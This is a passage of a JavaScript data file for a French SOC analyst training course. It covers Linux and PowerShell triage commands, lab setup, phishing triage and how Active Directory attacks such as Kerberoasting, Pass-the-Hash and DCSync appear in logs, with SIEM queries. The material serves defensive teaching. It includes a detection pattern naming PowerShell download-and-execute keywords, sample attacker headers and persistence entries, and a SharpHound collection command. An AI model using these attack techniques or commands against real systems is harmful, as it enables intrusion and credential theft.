                "grep 'Accepted\\|Failed' /var/log/auth.log | tail -100 → connexions récentes",
                "crontab -l && for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null; done",
                "cat /etc/passwd | grep -v nologin | grep -v false → utilisateurs avec shell"
              ],
              livrable: "Rapport CLI : processus suspect identifié, PID, commande, connexion C2 confirmée, méthode de persistance trouvée, prochaine étape recommandée.",
              questions_correction: [
                "Si le binaire est supprimé mais le processus tourne encore, comment récupérer le binaire ?",
                "cp /proc/[PID]/exe /tmp/malware.bin — récupérer depuis le /proc filesystem",
                "Un nouveau compte dans /etc/passwd avec uid=0 — que faire en priorité ?"
              ]
            },

            cas_concret: `## Script d'investigation rapide Windows — Cas réel

\`\`\`powershell
# ── SOC TRIAGE SCRIPT v1.0 ──────────────────────────────────
$ts = Get-Date -Format "yyyy-MM-dd_HH-mm"
$out = "C:\\Temp\\triage_$ts.txt"

"=== TRIAGE $(Get-Date) ===" | Tee-Object $out

# 1. Connexions réseau
"--- CONNEXIONS ETABLIES ---" | Tee-Object $out -Append
Get-NetTCPConnection -State Established | ForEach-Object {
  $p = Get-Process -Id $_.OwningProcess -EA SilentlyContinue
  "$($_.RemoteAddress):$($_.RemotePort) | $($p.Name) | $($p.Path)"
} | Tee-Object $out -Append

# 2. Processus avec CommandLine suspecte
"--- PROCESSUS SUSPECTS ---" | Tee-Object $out -Append
Get-WmiObject Win32_Process |
  Where-Object {$_.CommandLine -match "enc|hidden|bypass|iex|downloadstring|frombase64"} |
  Select-Object Name, ProcessId, CommandLine |
  Tee-Object $out -Append

# 3. Derniers Event 4688 (processus créés)
"--- DERNIERS PROCESSUS CREES ---" | Tee-Object $out -Append
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 30 |
  Select-Object TimeCreated,
    @{N='Process';E={$_.Properties[5].Value}},
    @{N='Parent';E={$_.Properties[13].Value}} |
  Tee-Object $out -Append

Write-Host "Rapport sauvé dans $out" -ForegroundColor Green
\`\`\``,

            exercices: [
              { titre: "50 one-liners — un par jour", desc: "Pratiquer un one-liner bash ou PowerShell par jour dans une VM : grep, awk, find, netstat, ps, Get-WinEvent, Get-NetTCPConnection…", difficulte: "facile", type: "lab" },
              { titre: "Écrire un script de triage Linux", desc: "Script bash qui : liste les connexions ESTABLISHED + process, les fichiers modifiés dans /tmp dans les 24h, les nouveaux users dans /etc/passwd, les cron jobs. Output dans un fichier.", difficulte: "avancé", type: "lab", outil: "bash" }
            ],

            questions: [
              "Comment lister toutes les connexions TCP établies avec le nom du processus sur Windows ? Sur Linux ?",
              "Un PowerShell avec -EncodedCommand dans les logs. Que faites-vous en premier ?",
              "Comment trouver tous les fichiers modifiés dans les dernières 24h sur Linux ?"
            ],

            niveau_recruteur: `## Attendu SOC L1

- Écrire un grep pour extraire des IPs de logs en 30 secondes
- Lister les connexions réseau + processus en CLI (Windows et Linux)
- Décoder un PowerShell Base64 en entretien
- Connaître les one-liners de base par cœur`,

            erreurs: [
              "Utiliser uniquement le GUI — en SOC, les logs sont sur des serveurs sans interface graphique.",
              "Oublier de sauvegarder les sorties CLI dans un fichier — la preuve doit être documentée.",
              "Ne pas vérifier les processus parents — c'est souvent plus important que le processus lui-même."
            ],
            resume: `PowerShell : Get-NetTCPConnection, Get-WmiObject Win32_Process, Get-WinEvent. Bash : ss -tulpn, grep + awk, find -mtime. PowerShell -enc = toujours suspect. Sauvegarder toutes les sorties dans des fichiers horodatés.`
          }
        },

        // ── M1C5 ──────────────────────────────────────────────
        {
          id: "m1c5",
          titre: "Virtualisation & Lab SOC",
          description: "Monter son propre environnement de lab pour pratiquer tous les scénarios SOC.",
          duree: "3 jours",
          difficulte: "débutant",
          prerequis: [],
          sous_competences: [
            "VirtualBox / VMware — réseaux isolés",
            "VMs essentielles : Kali, Windows, Ubuntu Server",
            "Snapshots et restauration",
            "Réseau lab : host-only, internal, NAT",
            "Premiers pas avec Docker pour les labs",
            "Ressources gratuites : TryHackMe, CyberDefenders"
          ],
          cours: {
            simple: `Un lab = ton terrain d'entraînement légal. Sans lab, pas de pratique. Sans pratique, pas de poste SOC. Le minimum viable est VirtualBox + Kali + Windows 10. Coût : 0€.`,
            technique: `## Architecture lab SOC minimale

\`\`\`
┌─────────────────────────────────────────────┐
│              HOST (ton PC)                   │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
│  │  Kali    │  │ Windows  │  │  Ubuntu  │  │
│  │ (attack) │  │  (cible) │  │  Server  │  │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  │
│       └─────────────┼──────────────┘        │
│              [Host-Only Network]             │
│               192.168.56.0/24               │
└─────────────────────────────────────────────┘
\`\`\`

**Modes réseau VirtualBox :**
- **NAT** : VM accède Internet, invisible depuis l'extérieur — pour les mises à jour
- **Host-Only** : VM ↔ Host seulement, isolé — pour les labs entre VMs
- **Internal Network** : VM ↔ VM seulement, pas de sortie — le plus isolé (analyse malware)
- **Bridged** : VM a une vraie IP sur ton réseau — ⚠️ éviter pour les labs offensifs

## Lab SOC avancé — ELK Stack
\`\`\`
┌──────────────────────────────────────────┐
│  ELK Stack (Ubuntu 4GB RAM)             │
│  Elasticsearch + Logstash + Kibana       │
│  → Collecte les logs de toutes les VMs  │
├──────────────────────────────────────────┤
│  Windows 10 + Sysmon                    │
│  → Génère des Event Logs réalistes      │
├──────────────────────────────────────────┤
│  Kali Linux                             │
│  → Lance les attaques                   │
└──────────────────────────────────────────┘
\`\`\``,
            attaquant: `N/A — le lab est l'environnement pour pratiquer toutes les attaques légalement.`,
            soc: `Le lab te permet de reproduire l'attaque → voir les logs → créer la règle de détection. Workflow obligatoire : attaque → log → alerte → investigation → règle SIEM.`,
            logs_exemples: `N/A`,
            atelier: {
              titre: "Atelier : Monter son lab SOC en 2h",
              duree: "2h",
              niveau: "débutant",
              objectif: "Avoir un lab fonctionnel avec Kali + Windows + Ubuntu en réseau isolé",
              contexte: "Ton premier jour de formation. Avant de faire quoi que ce soit, tu dois avoir un environnement de pratique.",
              outils: ["VirtualBox", "Kali Linux OVA", "Windows 10 ISO (évaluation Microsoft)"],
              etapes: [
                "Télécharger et installer VirtualBox + Extension Pack",
                "Créer un réseau Host-Only : File → Host Network Manager → Create",
                "Importer la VM Kali Linux (OVA disponible sur kali.org)",
                "Attacher Kali au réseau Host-Only",
                "Faire un snapshot 'Clean Install' sur Kali",
                "Créer une VM Windows 10 avec l'ISO d'évaluation (90 jours gratuits)",
                "Attacher Windows au même réseau Host-Only",
                "Vérifier : ping depuis Kali vers Windows et inversement",
                "Snapshot des deux VMs"
              ],
              livrable: "Lab fonctionnel documenté : IPs des VMs, mode réseau, snapshots créés."
            },
            cas_concret: `## Lab en 1 heure avec TryHackMe (sans VM locale)
Si ton PC est limité en RAM : TryHackMe propose un Kali Linux dans le navigateur. Accès aux labs directement sans installation. Idéal pour commencer. Parcours recommandé : SOC Level 1 (40h, gratuit en partie).`,
            exercices: [
              { titre: "Lab setup", desc: "Installer VirtualBox + Kali + Ubuntu Server. Vérifier la connectivité réseau entre les deux VMs.", difficulte: "facile", type: "lab", outil: "VirtualBox" }
            ],
            questions: [
              "Pourquoi ne pas utiliser le mode Bridged pour un lab offensif ?",
              "Qu'est-ce qu'un snapshot et pourquoi en faire avant chaque exercice ?"
            ],
            niveau_recruteur: `Avoir un lab personnel = différenciateur en entretien. Montre que tu pratiques en dehors du travail. Mentionne-le dans ton CV.`,
            erreurs: [
              "Faire des labs en réseau Bridged (VM visible sur le vrai réseau).",
              "Ne jamais faire de snapshots → impossible de revenir à un état clean."
            ],
            resume: `VirtualBox + Host-Only = lab isolé. Toujours snapshot avant manipulation. TryHackMe = alternative si RAM insuffisante. Workflow : attaque → log → règle.`
          }
        },

        // ── M1C6 (NOUVEAU) ────────────────────────────────────
        {
          id: "m1c6",
          titre: "Analyse d'emails suspects — Phishing triage",
          description: "Compétence n°1 du SOC L1. Analyser, qualifier et répondre à un signalement de phishing.",
          duree: "1 semaine",
          difficulte: "débutant",
          prerequis: ["m1c2"],
          sous_competences: [
            "Anatomie d'un email : headers, enveloppe SMTP, corps",
            "SPF / DKIM / DMARC — lire et interpréter",
            "Analyse de liens suspects sans cliquer (URLScan.io, VirusTotal)",
            "Analyse de pièces jointes en sandbox (Any.run, Hybrid Analysis)",
            "Indicateurs de phishing : urgence, sosie de domaine, typosquatting",
            "Workflow de triage phishing : de l'alerte au ticket fermé",
            "Outils : PhishTool, MXToolbox, Sublime Text (email analysis)"
          ],
          cours: {
            simple: `Le phishing représente 90% des vecteurs d'attaque initiaux. Chaque jour en SOC, tu recevras des signalements d'emails suspects. Savoir les qualifier rapidement (vrai phishing ou faux positif ?) et prendre les bonnes actions = compétence n°1 du L1.

**Les 3 questions à se poser :**
1. L'expéditeur est-il vraiment qui il prétend être ? (SPF/DKIM/DMARC)
2. Le lien/pièce jointe est-il malveillant ? (sandbox)
3. D'autres utilisateurs sont-ils impactés ? (recherche dans les logs)`,

            technique: `## Anatomie d'un email — Ce que les headers révèlent

\`\`\`
[ENVELOPPE SMTP — visible par les serveurs]
MAIL FROM: <attacker@evil.ru>      ← Return-Path (vrai expéditeur)

[HEADERS — visibles par le destinataire]
From: "Direction Générale" <dg@entreprise.fr>  ← Peut être falsifié
Reply-To: <collect@gmail.com>                   ← Où vont les réponses
To: victime@entreprise.fr
Subject: URGENT - Action requise
Date: Mon, 15 Jan 2024 09:00:00 +0100
Message-ID: <random@evil.ru>

[AUTHENTIFICATION — ajoutée par les serveurs de messagerie]
Authentication-Results: mx.entreprise.fr;
  spf=fail (203.0.113.42 is not authorized to send for entreprise.fr)
  dkim=none (no signature)
  dmarc=fail (p=none; rua=mailto:dmarc@entreprise.fr)
\`\`\`

## SPF / DKIM / DMARC — Lecture rapide

| Résultat | Signification | Action SOC |
|----------|--------------|------------|
| spf=pass | IP autorisée | OK |
| spf=fail | IP non autorisée | Suspect |
| spf=softfail | IP probablement non autorisée | Vérifier |
| dkim=pass | Signature valide | OK |
| dkim=none | Pas de signature | Suspect |
| dkim=fail | Signature invalide | Alerte |
| dmarc=pass | Politique respectée | OK |
| dmarc=fail p=reject | Rejeté par politique | Bloqué automatiquement |
| dmarc=fail p=none | Fail mais délivré quand même | Problème de config chez la victime |

## Sosies de domaines (Domain Spoofing / Typosquatting)

\`\`\`
Domaine légitime :    monentreprise.fr
Sosies courants :     monentreprise-rh.fr
                      rh.monentreprise.fr.evil.com  ← sous-domaine
                      monentrepnse.fr               ← typo
                      m0nentreprise.fr              ← homographe (0 vs o)
                      monentreprîse.fr              ← IDN (accent)
\`\`\``,

            attaquant: `## Techniques de phishing

**Spear Phishing (ciblé) :**
L'attaquant recherche la cible sur LinkedIn, trouve son manager, envoie un email qui semble venir du manager. Référence des projets réels, utilise le prénom.

**BEC (Business Email Compromise) :**
Usurpe un dirigeant (PDG, DRH) pour demander un virement urgent ou des données RH. SPF/DKIM souvent fail mais DMARC=none → email livré quand même.

**Callback Phishing :**
Email sans lien ni pièce jointe (contourne les filtres). Contient un numéro de téléphone. La victime appelle et donne ses credentials.

**HTML Smuggling :**
La pièce jointe HTML contient du JavaScript qui reconstruit le malware dans le navigateur, contournant les gateways email qui analysent les pièces jointes.

**QR Code Phishing (Quishing) :**
QR code dans l'email → redirige vers une fausse page de login. Les outils de sécurité email ne lisent pas les QR codes.`,

            soc: `## Workflow de triage phishing — Étape par étape

\`\`\`
1. RÉCEPTION DU SIGNALEMENT
   ↓
2. COLLECTE
   □ Obtenir l'email original (EML/MSG)
   □ Ne PAS ouvrir les liens ou PJ sur le poste de travail
   ↓
3. ANALYSE HEADERS
   □ MXToolbox Header Analyzer (coller les headers bruts)
   □ Vérifier : SPF / DKIM / DMARC
   □ Identifier l'IP réelle d'envoi (champ Received: from)
   □ IP sur AbuseIPDB
   ↓
4. ANALYSE LIEN(S)
   □ URLScan.io — scanner l'URL sans cliquer
   □ VirusTotal — checker l'URL et le domaine
   □ Whois du domaine — date de création (récent = suspect)
   ↓
5. ANALYSE PIÈCE JOINTE
   □ Hash SHA256 → VirusTotal
   □ Si inconnu → Any.run ou Hybrid Analysis (sandbox)
   □ Observer : connexions réseau, processus créés, fichiers déposés
   ↓
6. ÉVALUATION DE L'IMPACT
   □ Combien d'utilisateurs ont reçu cet email ?
   □ Combien l'ont ouvert ? (email gateway logs)
   □ Combien ont cliqué le lien ? (proxy logs)
   □ Des pièces jointes ont-elles été téléchargées ?
   ↓
7. ACTIONS
   □ Bloquer le domaine/IP sur le gateway email
   □ Supprimer l'email des boîtes restantes (admin email)
   □ Notifier les utilisateurs impactés
   □ Si clic confirmé → triage endpoint (EDR check)
   ↓
8. DOCUMENTATION
   □ Créer ticket dans TheHive / ServiceNow
   □ IOC : domaine, IP, hash, subject
   □ Verdict : vrai phishing / faux positif
\`\`\``,

            logs_exemples: `## Exemples terrain — Email gateway logs (Proofpoint / Microsoft Defender)

### Email gateway — Détection phishing
\`\`\`
2024-01-15 09:15:23 | INBOUND | FROM: ceo@monentreprise-urgent.com
  TO: comptabilite@victime.fr (x15 recipients)
  SUBJECT: [URGENT] Virement - Traiter avant 12h
  SPF: FAIL | DKIM: NONE | DMARC: FAIL
  ATTACHMENT: RIB_confidentiel.zip [SHA256: abc123...]
  ACTION: DELIVERED (DMARC policy=none)
  DISPOSITION: SUSPECT
\`\`\`

### Proxy logs — Clic sur lien phishing
\`\`\`
2024-01-15 09:23:01 | 192.168.10.55 | GET https://monentreprise-signin.xyz/login
  REFERRER: email_client | USER-AGENT: Chrome/120
  CATEGORY: Phishing | ACTION: BLOCKED
2024-01-15 09:23:04 | 192.168.10.87 | GET https://monentreprise-signin.xyz/login
  REFERRER: email_client | USER-AGENT: Chrome/120
  CATEGORY: Not Rated | ACTION: ALLOWED   ← Proxy pas encore mis à jour
\`\`\`
**Interprétation :** Un utilisateur (.55) bloqué, un autre (.87) a accédé au site de phishing.

### Any.run — Analyse sandbox d'une pièce jointe
\`\`\`
File: facture_2024.doc
SHA256: 3b4c5d6e7f...
Verdict: MALICIOUS

Network connections:
  → 185.220.x.x:443 (TLS) — DRIDEX C2
  → 8.8.8.8:53 (DNS) — résolution domaine

Processes created:
  WINWORD.EXE → cmd.exe → regsvr32.exe → rundll32.exe
  [MITRE T1218.010 - Regsvr32]

Registry modifications:
  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run → "Update" = rundll32.exe evil.dll
\`\`\``,

            atelier: {
              titre: "Atelier : Triage complet d'une campagne phishing",
              duree: "2h",
              niveau: "débutant",
              objectif: "Traiter un incident de phishing de bout en bout : analyse → impact → actions → documentation",
              contexte: "09h15 — Trois utilisateurs signalent le même email en 10 minutes. Sujet : 'Vérification RH — Confirmez vos informations avant ce soir'. L'email semble venir de rh@monentreprise.fr.",
              outils: ["MXToolbox", "URLScan.io", "VirusTotal", "AbuseIPDB", "Any.run (gratuit)"],
              donnees: `Email headers fournis :
\`\`\`
From: "RH - Marie Dupont" <rh@monentreprise.fr>
Reply-To: collect.rh.2024@outlook.com
Return-Path: bounce@mail-rh-entreprise.xyz
Received: from mail-rh-entreprise.xyz (45.142.x.x)
Subject: Vérification RH — Confirmez vos informations avant ce soir
Authentication-Results: spf=fail; dkim=none; dmarc=fail (p=quarantine)
URL dans le corps: https://monentreprise-rh-verification.xyz/confirm
Pièce jointe: formulaire_rh.html
\`\`\``,
              etapes: [
                "Headers → MXToolbox : analyser SPF/DKIM/DMARC, identifier IP réelle",
                "IP 45.142.x.x → AbuseIPDB : réputation",
                "URL https://monentreprise-rh-verification.xyz → URLScan.io + VirusTotal",
                "Domaine monentreprise-rh-verification.xyz → Whois : date de création",
                "Pièce jointe formulaire_rh.html → Any.run en sandbox",
                "Logs email gateway : combien ont reçu ? Ouvert ? Téléchargé la PJ ?",
                "Logs proxy : quelqu'un a visité l'URL ?",
                "Actions : bloquer domaine, supprimer emails, notifier utilisateurs impactés",
                "Créer le ticket : IOC, verdict, actions réalisées"
              ],
              livrable: "Ticket d'incident complet : chronologie, IOC (domaine + IP + hash), nombre d'utilisateurs impactés, actions réalisées, recommandations.",
              questions_correction: [
                "DMARC=fail p=quarantine mais l'email est arrivé en boîte de réception — comment ?",
                "Reply-To différent du From : quel est l'impact si l'utilisateur répond ?",
                "Comment retrouver tous les utilisateurs qui ont reçu cet email (même objet) ?"
              ]
            },

            cas_concret: `## Scénario terrain : BEC avancé (Business Email Compromise)

**Lundi 11h** — La comptable Marie reporte : "Le PDG m'a demandé par email de faire un virement urgent de 75 000€ pour une acquisition confidentielle. L'email semble venir de son adresse perso."

**Analyse headers :**
\`\`\`
From: "Jean Martin - PDG" <jmartin.pdg@gmail.com>
Subject: Acquisition confidentielle - Virement urgent
[Aucun header d'authentification d'entreprise]
IP d'envoi: Gmail → légitime côté Gmail mais compte Gmail externe
\`\`\`

**Indicateurs BEC :**
- Email depuis une boîte perso (pas @entreprise.fr)
- Urgence + confidentialité ("ne pas en parler")
- Demande financière inhabituelle
- Envoi hors des heures de bureau
- Marie n'a pas pu vérifier oralement (PDG "en réunion")

**Vérification :**
- Appel direct au PDG → confirme n'avoir rien envoyé
- Verdict : BEC confirmé, compte Gmail du PDG probablement compromis ou usurpé

**Actions :**
1. Confirmer que le virement n'a PAS été effectué
2. Bloquer l'adresse gmail dans les règles email
3. Sensibiliser Marie sur le processus de double validation
4. Vérifier si d'autres emails similaires ont été envoyés à d'autres comptables
5. Ouvrir incident P1 (risque financier direct)`,

            exercices: [
              { titre: "Analyser 5 emails suspects", desc: "Récupérer 5 exemples d'emails de phishing réels (PhishTank, OpenPhish). Pour chacun : analyser les headers, qualifier, identifier les IOC.", difficulte: "moyen", type: "analyse", outil: "MXToolbox, VirusTotal" },
              { titre: "URLScan.io — 10 URLs", desc: "Analyser 10 URLs suspectes sur URLScan.io sans cliquer. Pour chaque URL : screenshot de la page, certificat TLS, domaine créé quand, verdict.", difficulte: "facile", type: "lab", outil: "URLScan.io" },
              { titre: "Sandbox une pièce jointe", desc: "Télécharger un sample bénin depuis MalwareBazaar (tagged 'benign'). Le soumettre sur Any.run. Analyser le rapport : connexions réseau, processus, verdict.", difficulte: "moyen", type: "lab", outil: "Any.run, MalwareBazaar" }
            ],

            questions: [
              "SPF=pass mais l'email est quand même du phishing — comment est-ce possible ?",
              "Quelle est la différence entre phishing, spear-phishing et BEC ?",
              "Comment analyser un lien suspect sans cliquer dessus ?",
              "Un utilisateur a cliqué sur le lien de phishing il y a 2h. Quelles sont vos premières actions ?",
              "Qu'est-ce que le typosquatting et donnez 3 exemples pour 'google.fr' ?"
            ],

            niveau_recruteur: `## Attendu SOC L1 — Phishing triage

**Compétence critique — testée en entretien ET en pratique dès le 1er jour :**
- Analyser des headers email et conclure sur SPF/DKIM/DMARC
- Utiliser URLScan.io et VirusTotal sans hésiter
- Savoir ce qu'est une sandbox et pourquoi on l'utilise
- Connaître le workflow de triage phishing (les 8 étapes)

**Question piège fréquente :** "SPF=pass et DMARC=pass mais c'est quand même du phishing. Comment ?"
→ Réponse : le domaine d'envoi est un sosie (typosquatting). SPF/DKIM/DMARC sont valides pour LE SOSIE, pas pour le domaine légitime.`,

            erreurs: [
              "Ouvrir une pièce jointe suspecte sur son poste pour 'voir ce que c'est' — toujours utiliser une sandbox.",
              "Conclure 'c'est OK' parce que l'AV ne détecte rien — 0/72 VirusTotal ≠ sain.",
              "Traiter uniquement le signalement initial sans chercher les autres destinataires.",
              "Bloquer l'expéditeur mais pas le domaine entier — un attaquant change d'adresse en 2 minutes."
            ],
            resume: `Phishing = 90% des incidents initiaux. Workflow : headers → SPF/DKIM/DMARC → IP (AbuseIPDB) → URL (URLScan) → PJ (sandbox) → impact (combien ?) → actions → ticket. SPF=pass ≠ légitime si c'est un sosie de domaine.`
          }
        }
      ]
    },

    // ─────────────────────────────────────────────────────────
    // MODULE 2 — SYSTÈMES & ACTIVE DIRECTORY
    // ─────────────────────────────────────────────────────────
    {
      id: "m2",
      titre: "Systèmes & Active Directory",
      description: "Windows, Linux, Active Directory — l'infrastructure que vous défendez au quotidien. Comprendre les attaques AD pour les détecter dans les Event Logs.",
      icon: "🗄",
      couleur: "#a855f7",
      mois: "Mois 2–3",
      ordre: 2,
      objectif: "Lire et interpréter les logs Windows/Linux/AD. Reconnaître les attaques Active Directory dans les Event Logs.",
      competences: [
        {
          id: "m2c1",
          titre: "Active Directory — structure et attaques",
          description: "Comprendre AD pour reconnaître Kerberoasting, Pass-the-Hash et DCSync dans les logs.",
          duree: "2 semaines",
          difficulte: "intermédiaire",
          prerequis: ["m1c3"],
          sous_competences: [
            "Structure AD : domaine, forêt, OU, GPO",
            "Kerberos : AS-REQ/AS-REP, TGT, TGS — sans la théorie inutile",
            "Attaque : Kerberoasting (Event 4769)",
            "Attaque : AS-REP Roasting (Event 4768)",
            "Attaque : Pass-the-Hash (Event 4624 LogonType 3 + NTLM)",
            "Attaque : DCSync (Event 4662)",
            "Attaque : BloodHound — cartographie des chemins d'attaque",
            "Détection dans les Event Logs Windows"
          ],
          cours: {
            simple: `Active Directory (AD) est le système d'identité de 90% des entreprises françaises. C'est la cible n°1 des attaquants lors d'un ransomware ou d'une intrusion avancée. Comprendre son fonctionnement te permet de reconnaître immédiatement les attaques dans les logs.

---

## C'est quoi Active Directory ?

**Ce que c'est :** Un annuaire centralisé qui gère les identités (utilisateurs, ordinateurs, groupes) et l'accès aux ressources dans un réseau Windows. Tout passe par lui : connexions, partages, GPO, emails.

**Les composants clés :**
- **Domain Controller (DC)** : le serveur qui fait tourner AD. Le pirater = Game Over pour l'entreprise
- **Domaine** : ex. \`entreprise.local\` — le périmètre d'autorité de l'AD
- **OU (Organizational Unit)** : dossiers organisationnels (Direction, IT, RH...)
- **GPO** : politiques de groupe appliquées automatiquement aux machines/users
- **Kerberos** : le protocole d'authentification d'AD (remplace NTLM)

---

## Kerberos — Comment ça marche en pratique

**Sans rentrer dans la théorie :** quand un utilisateur se connecte, AD lui donne un "ticket" (TGT) valable 10 heures. Pour accéder à une ressource, il échange ce ticket contre un ticket de service (TGS).

**Ce que tu vois en logs (Event Logs du DC) :**
- **Event 4768** : demande de TGT (Kerberos Authentication) → connexion utilisateur
- **Event 4769** : demande de TGS (ticket de service) → accès à une ressource
- **Event 4771** : échec de pré-authentification Kerberos → mauvais mot de passe

**Signal d'alarme :**
- Event 4769 avec **RC4 encryption** (etype 0x17) pour des comptes de service → Kerberoasting en cours
- Des dizaines de 4771 en quelques secondes sur le même compte → brute force

---

## Attaques AD à reconnaître en SOC

### Kerberoasting
**Ce que fait l'attaquant :** demander des tickets TGS pour des comptes de service, puis les cracker hors ligne.

**Ce que tu vois :** Event 4769 en masse avec RC4 depuis un seul utilisateur vers plusieurs comptes de service en quelques secondes.

**Ton réflexe :** SIEM → alerte sur spike de 4769 avec RC4 depuis un même compte source.

---

### Pass-the-Hash (PtH)
**Ce que fait l'attaquant :** utiliser le hash NTLM d'un mot de passe (volé via Mimikatz) pour s'authentifier sans connaître le mot de passe en clair.

**Ce que tu vois :**
- Event **4624 LogonType 3** (connexion réseau) depuis un poste inhabituel
- NTLM au lieu de Kerberos (suspect si Kerberos est configuré)
- Connexion depuis un process comme \`cmd.exe\` ou \`mimikatz.exe\`

**Ton réflexe :** EDR → chercher l'exécution de Mimikatz (\`sekurlsa::logonpasswords\`) dans l'arbre de processus.

---

### DCSync
**Ce que fait l'attaquant :** simuler un Domain Controller pour extraire tous les hashes de mots de passe de l'AD (y compris krbtgt → Golden Ticket).

**Ce que tu vois :**
- Event **4662** : accès à un objet AD avec les droits \`Replicating Directory Changes\`
- Depuis un compte non-DC et une IP non-DC

**Ton réflexe :** alerte SIEM sur 4662 depuis une source qui n'est pas un DC légitime → escalade immédiate, compromission critique.

---

### BloodHound — Cartographie des chemins d'attaque
**Ce que fait l'attaquant :** collecter des informations AD (LDAP queries massives) pour trouver le chemin le plus court vers Domain Admin.

**Ce que tu vois :** spike de requêtes LDAP depuis un poste utilisateur, souvent avec SharpHound.exe détecté par l'EDR.

---

## Tableau de référence SOC — AD

| Attaque | Event ID clé | Signal |
|---------|-------------|--------|
| Kerberoasting | 4769 | RC4, masse de TGS en peu de temps |
| AS-REP Roasting | 4768 | Compte sans pré-auth requis |
| Pass-the-Hash | 4624 | LogonType 3, NTLM, IP suspecte |
| DCSync | 4662 | Replication rights depuis non-DC |
| Brute force | 4625/4771 | Masse d'échecs sur même compte |
| BloodHound | Logs LDAP | Spike requêtes LDAP massives |

**Règle SOC :** toute activité anormale sur un Domain Controller = escalade prioritaire. Le DC compromis = tout le réseau compromis.`,
            technique: `## Kerberos simplifié — ce que SOC doit savoir

\`\`\`
1. Client → KDC : AS-REQ (demande de TGT)     [Event 4768]
2. KDC → Client : AS-REP (TGT chiffré)
3. Client → KDC : TGS-REQ (demande ticket service) [Event 4769]
4. KDC → Client : TGS-REP (ticket service chiffré)
5. Client → Service : auth avec le ticket
\`\`\`

## Attaques AD et leurs signatures logs

### Kerberoasting (T1558.003)
Demande des tickets TGS pour des comptes de service, puis tente de casser le hash hors ligne.
\`\`\`
Event 4769 — Kerberos Service Ticket Request
  TicketOptions: 0x40810000
  TicketEncryptionType: 0x17  ← RC4 = suspect (devrait être AES)
  ServiceName: MSSQLSvc/srv-sql.domain.local
  ClientAddress: 192.168.1.50
\`\`\`
Détection : Event 4769 avec EncType=0x17 en masse depuis un seul client.

### AS-REP Roasting (T1558.004)
Comptes sans pré-authentification Kerberos — le KDC répond sans vérifier.
\`\`\`
Event 4768 — Kerberos TGT Request
  PreAuthType: 0  ← Pré-auth désactivée = vulnérable
  ClientAddress: 192.168.1.50
\`\`\`

### Pass-the-Hash (T1550.002)
Utilisation du hash NTLM directement sans connaître le mot de passe.
\`\`\`
Event 4624 — Logon Success
  LogonType: 3 (Network)
  AuthPackage: NTLM           ← Kerberos serait normal en AD
  WorkstationName: KALI       ← Nom de machine suspect
  TargetUserName: administrator
\`\`\`

### DCSync (T1003.006)
Simule un contrôleur de domaine pour demander la réplication des hashes.
\`\`\`
Event 4662 — Operation on AD Object
  ObjectType: domainDNS
  Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  ← DS-Replication-Get-Changes
  SubjectUserName: john.doe   ← Utilisateur normal qui réplique = CRITIQUE
\`\`\``,
            attaquant: `## BloodHound — cartographie AD

BloodHound collecte les relations AD (membres de groupes, sessions, droits) et trouve les chemins d'attaque.

\`\`\`bash
# Collecte (SharpHound)
SharpHound.exe -c All --zipfilename bloodhound.zip

# Requêtes BloodHound utiles (côté attaquant)
"Shortest Paths to Domain Admin"
"Find All Domain Admins"
"Users with DCSync Rights"
\`\`\`

Côté SOC : installer BloodHound sur votre propre AD pour identifier les chemins avant l'attaquant.`,
            soc: `## Règles de détection AD

**Kerberoasting :**
\`\`\`
index=wineventlog EventCode=4769
| where TicketEncryptionType="0x17"
| stats count by src_ip, ServiceName, SubjectUserName
| where count > 5
| sort -count
\`\`\`

**Pass-the-Hash :**
\`\`\`
index=wineventlog EventCode=4624
| where LogonType=3 AND AuthenticationPackageName="NTLM"
| where TargetUserName!="ANONYMOUS LOGON"
| stats count by src_ip, TargetUserName
| where count > 3
\`\`\`

**DCSync :**
\`\`\`
index=wineventlog EventCode=4662
| where Properties IN ("*1131f6aa*","*1131f6ab*","*89e95b76*")
| where SubjectUserName!="*$"  ← exclure les vrais DC (compte machine)
| table _time, SubjectUserName, ObjectName
\`\`\``,
            logs_exemples: `## Event 4769 — Kerberoasting détecté
\`\`\`
EventID: 4769
TimeCreated: 2024-01-15 14:32:01
Computer: DC01.corp.local
SubjectUserName: john.doe
ServiceName: MSSQLSvc/sql01.corp.local:1433
TicketOptions: 0x40810000
TicketEncryptionType: 0x17   ← RC4-HMAC (faible, cassable hors ligne)
ClientAddress: ::ffff:192.168.1.88

[4769 x 47 en 2 minutes, même ClientAddress, services différents]
\`\`\`
**Interprétation :** Kerberoasting en cours depuis 192.168.1.88. L'attaquant récupère des tickets pour les casser hors ligne.`,
            atelier: {
              titre: "Atelier : Détecter Kerberoasting dans des Event Logs",
              duree: "1h30",
              niveau: "intermédiaire",
              objectif: "Identifier une attaque Kerberoasting dans des Event Logs Windows et créer la règle de détection",
              contexte: "Alerte SIEM : volume anormal d'Event 4769 depuis WKS-012. Investiguer.",
              outils: ["Windows Event Viewer ou jeu de logs fourni", "Splunk Free ou ELK"],
              etapes: [
                "Filtrer les Event 4769 des dernières 2h",
                "Identifier les entrées avec TicketEncryptionType=0x17 (RC4)",
                "Compter les occurrences par IP source",
                "Identifier les ServiceNames ciblés",
                "Comparer avec une baseline normale (combien de 4769 habituellement ?)",
                "Chercher le compte source : est-il légitime ? Heure normale ?",
                "Créer la règle SIEM"
              ],
              livrable: "Rapport : compte attaquant identifié, services ciblés, heure d'attaque, règle SIEM créée."
            },
            cas_concret: `## Scénario : Pass-the-Hash détecté en production

**Alerte SIEM 16h30 :** "NTLM auth from non-DC source for admin account"

Event 4624 sur DC01 :
- LogonType: 3 | AuthPackage: NTLM | TargetUser: svc-backup | Source: 192.168.5.33

Problème : svc-backup ne devrait JAMAIS s'authentifier en NTLM depuis un poste utilisateur. Kerberos seulement depuis les serveurs de backup.

Actions : isoler 192.168.5.33, investiguer comment le hash a été volé (Mimikatz sur un poste précédemment compromis), reset du compte svc-backup, vérifier les droits excessifs du compte.`,
            exercices: [
              { titre: "Lab BloodHound sur son AD de test", desc: "Monter un AD minimal (Windows Server en VM). Installer SharpHound, collecter les données, visualiser dans BloodHound. Identifier les chemins vers Domain Admin.", difficulte: "avancé", type: "lab", outil: "Windows Server VM, BloodHound" },
